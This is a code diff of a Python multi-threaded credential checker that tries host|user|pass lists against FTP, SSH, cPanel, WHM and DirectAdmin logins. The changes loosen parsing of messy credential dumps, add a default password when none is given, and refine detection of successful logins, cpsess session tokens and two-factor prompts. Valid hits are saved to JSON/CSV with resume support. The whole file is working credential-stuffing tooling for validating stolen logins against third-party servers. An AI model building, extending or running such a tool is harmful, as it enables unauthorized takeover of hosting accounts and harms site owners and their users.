@@ -76,33 +76,70 @@ def update_stats(service, result, result_type='success'):
             stats[f'{service}_failed'] += 1
 
 def parse_credentials(line):
-    """Enhanced credential parsing with validation"""
+    """Enhanced credential parsing with validation for inconsistent formats"""
     line = line.strip()
     if not line or line.startswith('#'):
         return None
     
     try:
-        # Support multiple formats: host|user|pass, host:port|user|pass, host user pass
-        if '|' in line:
+        # Handle cpsess token format: host|port|cpsess_token/path
+        if 'cpsess' in line and '|' in line:
             parts = line.split('|', 2)
+            if len(parts) == 3 and 'cpsess' in parts[2]:
+                # This is a session token format, skip for now
+                log_message(f"SKIPPED - Session token format: {line}", "INFO")
+                return None
+        
+        # Handle malformed formats: host|port|username instead of host:port|username|pass
+        if '|' in line:
+            parts = line.split('|')
+            if len(parts) == 3:
+                # Standard format: host|user|pass or host:port|user|pass
+                host, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
+            elif len(parts) == 4:
+                # Malformed format: host|port|user|pass - fix it
+                host_part, port_part, username, password = [p.strip() for p in parts]
+                if port_part.isdigit():
+                    host = f"{host_part}:{port_part}"
+                else:
+                    # Not a port, treat as username|pass|extra
+                    host, username, password = host_part, port_part, username
+            elif len(parts) == 2:
+                # Format: host|user (no password) - use fakepassword2 as default
+                host, username = parts[0].strip(), parts[1].strip()
+                password = "fakepassword2"
+                log_message(f"INFO - No password provided, using default: {line}", "INFO")
+            else:
+                log_message(f"Invalid credential format (too many parts): {line}", "ERROR")
+                return None
         else:
+            # Space-separated format: host user pass
             parts = line.split(None, 2)
+            if len(parts) < 2:
+                log_message(f"Invalid credential format: {line}", "ERROR")
+                return None
+            elif len(parts) == 2:
+                # Format: host user (no password)
+                host, username = parts[0].strip(), parts[1].strip()
+                password = "fakepassword2"
+                log_message(f"INFO - No password provided, using default: {line}", "INFO")
+            else:
+                host, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
         
-        if len(parts) < 3:
-            log_message(f"Invalid credential format: {line}", "ERROR")
-            return None
-        
-        host, username, password = parts[0].strip(), parts[1].strip(), parts[2].strip()
+        # Handle fake passwords (common in datasets)
+        if password.lower() in ['fakepassword', 'fakepassword2', 'fake', 'password']:
+            log_message(f"INFO - Detected fake password, will test anyway: {host}|{username}|{password}", "INFO")
         
         # Validate inputs
-        if not all([host, username, password]):
-            log_message(f"Empty fields in credential: {line}", "ERROR")
+        if not all([host, username]):
+            log_message(f"Missing host or username: {line}", "ERROR")
             return None
         
         # Clean and validate hostname
+        original_host = host
         host = clean_hostname(host)
-        if not is_valid_hostname(host):
-            log_message(f"Invalid hostname: {host}", "ERROR")
+        if not is_valid_hostname_relaxed(host):
+            log_message(f"Invalid hostname after cleaning: {original_host} -> {host}", "ERROR")
             return None
         
         return host, username, password
@@ -128,47 +165,59 @@ def clean_hostname(host):
         elif host.startswith('-'):
             host = host[1:]  # Remove single dash
     
+    # Remove any trailing slash or path
+    if '/' in host:
+        host = host.split('/')[0]
+    
     # Remove any trailing slash
     host = host.rstrip('/')
     
     return host
 
-def is_valid_hostname(hostname):
-    """Validate hostname format"""
+def is_valid_hostname_relaxed(hostname):
+    """Relaxed hostname validation for credential testing"""
     if not hostname:
         return False
     
-    # Basic hostname validation
+    # Basic length check
     if len(hostname) > 253:
         return False
     
-    # Check for invalid characters
+    # Split on colon to separate hostname from port
+    host_part = hostname.split(':')[0] if ':' in hostname else hostname
+    port_part = None
+    
+    if ':' in hostname:
+        parts = hostname.rsplit(':', 1)
+        if len(parts) == 2 and parts[1].isdigit():
+            host_part = parts[0]
+            port_part = int(parts[1])
+            # Validate port range
+            if port_part < 1 or port_part > 65535:
+                return False
+    
+    # Check for invalid characters in hostname part (more permissive)
     import string
     allowed_chars = string.ascii_letters + string.digits + '.-'
-    if not all(c in allowed_chars for c in hostname):
+    if not all(c in allowed_chars for c in host_part):
         return False
     
-    # Check if hostname starts or ends with dash or dot
-    if hostname.startswith(('.', '-')) or hostname.endswith(('.', '-')):
+    # Must contain at least one dot (for domain) or be localhost-style
+    if '.' not in host_part and host_part not in ['localhost']:
         return False
     
     # Check for consecutive dots
-    if '..' in hostname:
+    if '..' in host_part:
         return False
     
-    # Must contain at least one dot (for domain)
-    if '.' not in hostname:
-        return False
-    
-    # Check each label
-    labels = hostname.split('.')
-    for label in labels:
-        if not label:  # Empty label
-            return False
-        if len(label) > 63:  # Label too long
-            return False
-        if label.startswith('-') or label.endswith('-'):  # Label starts/ends with dash
-            return False
+    # Check each label in hostname
+    if '.' in host_part:
+        labels = host_part.split('.')
+        for label in labels:
+            if not label:  # Empty label
+                return False
+            if len(label) > 63:  # Label too long
+                return False
     
     return True
 
@@ -190,6 +239,11 @@ def should_skip_host(hostname):
         hostname in ['localhost', '127.0.0.1', '0.0.0.0'],
         'example.com' in hostname,
         'test.com' in hostname and len(hostname) < 15,
+        # Skip non-ASCII hostnames that might cause issues
+        not all(ord(c) < 128 for c in hostname),
+        # Skip hostnames with obvious malformation
+        '..' in hostname,
+        hostname.startswith('.') or hostname.endswith('.'),
     ]
     
     return any(invalid_patterns)
@@ -252,35 +306,50 @@ def prefilter_credentials(credentials_list):
     return filtered_list
 
 def extract_session_id(response_text, url):
-    """Extract session ID from cPanel/WHM responses"""
-    # Look for cpsess pattern in response text or URL redirects
+    """Extract session ID from cPanel/WHM responses with improved patterns"""
+    # Look for cpsess pattern in response text or URL redirects (based on analysis insights)
     session_patterns = [
-        r'cpsess(\d+)',
-        r'/cpsess(\d+)/',
-        r'sessionID["\']:\s*["\']([^"\']+)["\']',
-        r'session_id["\']:\s*["\']([^"\']+)["\']'
+        r'cpsess(\d{8,})',  # More specific: at least 8 digits
+        r'/cpsess(\d{8,})/',
+        r'sessionID["\']:\s*["\']cpsess(\d+)["\']',
+        r'session_id["\']:\s*["\']cpsess(\d+)["\']',
+        r'cpsess(\d+)/frontend'  # Pattern from analysis showing cpsess+digits/frontend
     ]
     
     for pattern in session_patterns:
         match = re.search(pattern, response_text)
         if match:
-            return match.group(1) if 'cpsess' in pattern else match.group(1)
+            return f"cpsess{match.group(1)}"
+    
+    # Check in URL itself
+    url_patterns = [
+        r'cpsess(\d{8,})'
+    ]
+    
+    for pattern in url_patterns:
+        match = re.search(pattern, url)
+        if match:
+            return f"cpsess{match.group(1)}"
     
     return None
 
 def detect_tfa_requirement(response_text, status_code):
-    """Detect if Two-Factor Authentication is required"""
+    """Enhanced TFA detection based on analysis insights"""
     tfa_indicators = [
-        'tfatoken',
+        'tfatoken',  # Direct from analysis
         'security code',
+        'Enter the security code',  # Exact phrase from analysis
         'two-factor',
-        'Enter the security code',
         'authentication code',
         'verification code',
-        'Security Code Required'
+        'Security Code Required',  # From analysis
+        'Enter the security code for',  # Rumahweb pattern from analysis
+        'cPanel Login Security'  # From analysis page title
     ]
     
-    return any(indicator.lower() in response_text.lower() for indicator in tfa_indicators)
+    # Case-insensitive search for TFA indicators
+    response_lower = response_text.lower()
+    return any(indicator.lower() in response_lower for indicator in tfa_indicators)
 
 def save_result(service, host, username, password, status, session_id=None, tfa_required=False):
     """Save successful result to appropriate output file and structured data"""
@@ -515,17 +584,18 @@ def check_login(line, login_type, session=None, timeout=15, verify_ssl=False):
         
         # Enhanced success detection based on analysis insights
         success_indicators = [
-            # Traditional indicators
-            ("status" in response_text and "security_token" in response_text),
-            # Session ID in response
-            extract_session_id(response_text, response.url) is not None,
-            # HTTP redirect with session
-            (status_code in [200, 302] and 'cpsess' in response.url),
-            # Success page indicators
-            ("cPanel" in response_text and "index.html" in response.url),
-            ("WHM" in response_text and status_code == 200),
-            # JSON response success
-            (status_code == 200 and response.headers.get('content-type', '').startswith('application/json'))
+            # Pattern 1: Session ID in URL redirect (primary success indicator from analysis)
+            (status_code in [200, 302] and extract_session_id(response_text, response.url) is not None),
+            # Pattern 2: Successful redirect to dashboard with session
+            (status_code in [200, 302] and 'cpsess' in response.url and 'frontend' in response.url),
+            # Pattern 3: JSON response with status and security_token
+            (status_code == 200 and "status" in response_text and "security_token" in response_text),
+            # Pattern 4: Dashboard page indicators from analysis
+            (status_code == 200 and ("cPanel - " in response_text or "WHM - " in response_text)),
+            # Pattern 5: Success page with index.html in URL
+            (status_code == 200 and "index.html" in response.url and 'cpsess' in response.url),
+            # Pattern 6: Specific success patterns from analysis
+            (status_code == 200 and ("Tools" in response_text or "Espace Technique" in response_text) and 'cpsess' in response.url)
         ]
         
         if any(success_indicators):
@@ -535,14 +605,18 @@ def check_login(line, login_type, session=None, timeout=15, verify_ssl=False):
             save_result(login_type, original_host, username, password, 'success', session_id)
             return True
         
-        # Enhanced failure detection based on analysis
+        # Enhanced failure detection based on analysis patterns
         elif status_code == 401:
-            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: 401 Unauthorized", "FAILED", login_type.upper())
-        elif "The login is invalid" in response_text:
-            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: Invalid credentials", "FAILED", login_type.upper())
+            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: 401 Unauthorized (Invalid credentials)", "FAILED", login_type.upper())
+        elif "The login is invalid" in response_text:  # Exact error message from analysis
+            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: Invalid login credentials", "FAILED", login_type.upper())
+        elif "login is invalid" in response_text.lower():  # Case-insensitive variant
+            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: Login invalid", "FAILED", login_type.upper())
         elif status_code >= 500:
             log_message(f"FAILED - URL: {login_url} | Error: Server error ({status_code})", "FAILED", login_type.upper())
             stats['errors'] += 1
+        elif status_code == 403:
+            log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | Error: 403 Forbidden (Access denied)", "FAILED", login_type.upper())
         else:
             log_message(f"FAILED - URL: {login_url} | User: {username} | Pass: {password} | HTTP: {status_code}", "FAILED", login_type.upper())
         
@@ -550,34 +624,71 @@ def check_login(line, login_type, session=None, timeout=15, verify_ssl=False):
         return False
 
     except requests.exceptions.ConnectTimeout:
-        log_message(f"TIMEOUT - URL: {login_url} | Error: Connection timeout", "FAILED", login_type.upper())
+        log_message(f"TIMEOUT - URL: {login_url} | Error: Connection timeout after {timeout}s", "FAILED", login_type.upper())
+        update_stats(login_type, False)
+        stats['timeouts'] += 1
+        return False
+        
+    except requests.exceptions.ReadTimeout:
+        log_message(f"TIMEOUT - URL: {login_url} | Error: Read timeout after {timeout}s", "FAILED", login_type.upper())
+        update_stats(login_type, False)
+        stats['timeouts'] += 1
+        return False
+        
+    except requests.exceptions.Timeout:
+        log_message(f"TIMEOUT - URL: {login_url} | Error: Request timeout after {timeout}s", "FAILED", login_type.upper())
         update_stats(login_type, False)
         stats['timeouts'] += 1
         return False
         
     except requests.exceptions.SSLError as e:
-        log_message(f"SSL_ERROR - URL: {login_url} | Error: SSL verification failed", "FAILED", login_type.upper())
+        error_detail = str(e)
+        if "certificate verify failed" in error_detail:
+            log_message(f"SSL_ERROR - URL: {login_url} | Error: SSL certificate verification failed", "FAILED", login_type.upper())
+        elif "SSL: WRONG_VERSION_NUMBER" in error_detail:
+            log_message(f"SSL_ERROR - URL: {login_url} | Error: SSL version mismatch (not HTTPS?)", "FAILED", login_type.upper())
+        else:
+            log_message(f"SSL_ERROR - URL: {login_url} | Error: SSL error - {error_detail[:100]}", "FAILED", login_type.upper())
         update_stats(login_type, False)
         stats['errors'] += 1
         return False
         
     except requests.exceptions.ConnectionError as e:
-        if "getaddrinfo failed" in str(e) or "Failed to resolve" in str(e):
+        error_detail = str(e)
+        if "getaddrinfo failed" in error_detail or "Failed to resolve" in error_detail:
             log_message(f"DNS_ERROR - Host: {host} | Error: Hostname resolution failed", "FAILED", login_type.upper())
+        elif "Connection refused" in error_detail:
+            log_message(f"CONNECTION_ERROR - URL: {login_url} | Error: Connection refused (port closed)", "FAILED", login_type.upper())
+        elif "Network is unreachable" in error_detail:
+            log_message(f"NETWORK_ERROR - URL: {login_url} | Error: Network unreachable", "FAILED", login_type.upper())
         else:
-            log_message(f"CONNECTION_ERROR - URL: {login_url} | Error: Connection failed - {str(e)}", "FAILED", login_type.upper())
+            log_message(f"CONNECTION_ERROR - URL: {login_url} | Error: {error_detail[:100]}", "FAILED", login_type.upper())
+        update_stats(login_type, False)
+        stats['errors'] += 1
+        return False
+
+    except requests.exceptions.TooManyRedirects:
+        log_message(f"REDIRECT_ERROR - URL: {login_url} | Error: Too many redirects", "FAILED", login_type.upper())
         update_stats(login_type, False)
         stats['errors'] += 1
         return False
 
     except requests.exceptions.RequestException as e:
-        log_message(f"REQUEST_ERROR - URL: {login_url} | Error: {str(e)}", "FAILED", login_type.upper())
+        error_detail = str(e)
+        log_message(f"REQUEST_ERROR - URL: {login_url} | Error: {error_detail[:100]}", "FAILED", login_type.upper())
+        update_stats(login_type, False)
+        stats['errors'] += 1
+        return False
+        
+    except UnicodeDecodeError as e:
+        log_message(f"ENCODING_ERROR - URL: {login_url} | Error: Response encoding issue", "FAILED", login_type.upper())
         update_stats(login_type, False)
         stats['errors'] += 1
         return False
         
     except Exception as e:
-        log_message(f"ERROR - URL: {login_url} | User: {username} | Pass: {password} | Error: {str(e)}", "ERROR", login_type.upper())
+        error_detail = str(e)
+        log_message(f"UNEXPECTED_ERROR - URL: {login_url} | User: {username} | Error: {error_detail[:100]}", "ERROR", login_type.upper())
         update_stats(login_type, False)
         stats['errors'] += 1
         return False
@@ -685,8 +796,9 @@ def check_directadmin(line, session=None, timeout=15, verify_ssl=False):
 
 
 def save_structured_results(output_format, filename=None):
-    """Save results in structured formats (JSON/CSV)"""
+    """Save results in structured formats (JSON/CSV) with resumability support"""
     if not results_data:
+        log_message("No results to save", "INFO")
         return
     
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -695,30 +807,62 @@ def save_structured_results(output_format, filename=None):
         filename = filename or f'output/results_{timestamp}.json'
         os.makedirs('output', exist_ok=True)
         
-        with open(filename, 'w', encoding='utf-8') as f:
-            json.dump({
-                'metadata': {
-                    'timestamp': datetime.now().isoformat(),
-                    'total_tested': stats['total_tested'],
-                    'statistics': stats
-                },
-                'results': results_data
-            }, f, indent=2, ensure_ascii=False)
+        # Include detailed metadata for resumability
+        output_data = {
+            'metadata': {
+                'version': '2.0',
+                'timestamp': datetime.now().isoformat(),
+                'total_tested': stats['total_tested'],
+                'total_successful': sum(stats[f'{service}_success'] for service in ['ftp', 'ssh', 'cpanel', 'whm', 'directadmin']),
+                'total_tfa_required': sum(stats[f'{service}_tfa'] for service in ['ftp', 'ssh', 'cpanel', 'whm', 'directadmin']),
+                'statistics': stats,
+                'resumable': True
+            },
+            'results': results_data
+        }
         
-        log_message(f"Results saved to JSON: {filename}", "INFO")
+        with open(filename, 'w', encoding='utf-8') as f:
+            json.dump(output_data, f, indent=2, ensure_ascii=False)
+        
+        log_message(f"Results saved to JSON: {filename} ({len(results_data)} entries)", "INFO")
         
     elif output_format.lower() == 'csv':
         filename = filename or f'output/results_{timestamp}.csv'
         os.makedirs('output', exist_ok=True)
         
         if results_data:
-            fieldnames = results_data[0].keys()
+            # Add enhanced fields for CSV
+            enhanced_data = []
+            for result in results_data:
+                enhanced_result = result.copy()
+                enhanced_result['success_rate'] = 'Success' if result['status'] in ['success', 'tfa_required'] else 'Failed'
+                enhanced_result['has_session'] = 'Yes' if result.get('session_id') else 'No'
+                enhanced_data.append(enhanced_result)
+            
+            fieldnames = enhanced_data[0].keys()
             with open(filename, 'w', newline='', encoding='utf-8') as f:
                 writer = csv.DictWriter(f, fieldnames=fieldnames)
                 writer.writeheader()
-                writer.writerows(results_data)
+                writer.writerows(enhanced_data)
         
-        log_message(f"Results saved to CSV: {filename}", "INFO")
+        log_message(f"Results saved to CSV: {filename} ({len(results_data)} entries)", "INFO")
+
+def load_previous_results(filename):
+    """Load previous results for resume functionality"""
+    if not os.path.exists(filename):
+        return []
+    
+    try:
+        with open(filename, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+            if isinstance(data, dict) and 'results' in data:
+                return data['results']
+            elif isinstance(data, list):
+                return data
+    except Exception as e:
+        log_message(f"Error loading previous results: {e}", "ERROR")
+    
+    return []
 
 def print_stats():
     """Enhanced statistics with TFA tracking and error metrics"""
@@ -874,7 +1018,12 @@ Examples:
         # Setup shared session for web services
         web_session = setup_session(args.timeout, not args.no_ssl_verify, args.max_retries)
         
-        # Execute checks with enhanced thread pool
+        # Execute checks with enhanced thread pool and progress tracking
+        total_tasks = len(list_data) * len(services_to_test)
+        completed_tasks = 0
+        
+        log_message(f"Queuing {total_tasks} total tasks across {len(services_to_test)} services", "INFO")
+        
         with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
             futures = []
             
@@ -884,24 +1033,34 @@ Examples:
                 
                 # Submit tasks for each enabled service
                 if 'ftp' in services_to_test:
-                    futures.append(executor.submit(check_ftp, line, args.timeout))
+                    futures.append(('ftp', executor.submit(check_ftp, line, args.timeout)))
                 if 'ssh' in services_to_test:
-                    futures.append(executor.submit(check_ssh, line, args.timeout))
+                    futures.append(('ssh', executor.submit(check_ssh, line, args.timeout)))
                 if 'cpanel' in services_to_test:
-                    futures.append(executor.submit(check_login, line, 'cpanel', web_session, args.timeout, not args.no_ssl_verify))
+                    futures.append(('cpanel', executor.submit(check_login, line, 'cpanel', web_session, args.timeout, not args.no_ssl_verify)))
                 if 'whm' in services_to_test:
-                    futures.append(executor.submit(check_login, line, 'whm', web_session, args.timeout, not args.no_ssl_verify))
+                    futures.append(('whm', executor.submit(check_login, line, 'whm', web_session, args.timeout, not args.no_ssl_verify)))
                 if 'directadmin' in services_to_test:
-                    futures.append(executor.submit(check_directadmin, line, web_session, args.timeout, not args.no_ssl_verify))
+                    futures.append(('directadmin', executor.submit(check_directadmin, line, web_session, args.timeout, not args.no_ssl_verify)))
             
             # Wait for completion with progress tracking
-            for future in concurrent.futures.as_completed(futures):
+            log_message(f"Processing {len(futures)} tasks...", "INFO")
+            
+            for future_info in concurrent.futures.as_completed([f for s, f in futures]):
                 if shutdown_requested:
                     break
                 try:
-                    future.result()
+                    future_info.result()
+                    completed_tasks += 1
+                    
+                    # Log progress every 25 tasks or major milestones
+                    if completed_tasks % 25 == 0 or completed_tasks in [1, 10, 50, 100]:
+                        progress_pct = (completed_tasks / len(futures)) * 100
+                        log_message(f"Progress: {completed_tasks}/{len(futures)} tasks completed ({progress_pct:.1f}%)", "INFO")
+                        
                 except Exception as e:
                     log_message(f"Task execution error: {e}", "ERROR")
+                    completed_tasks += 1
         
         # Print final statistics
         log_message("", "INFO")
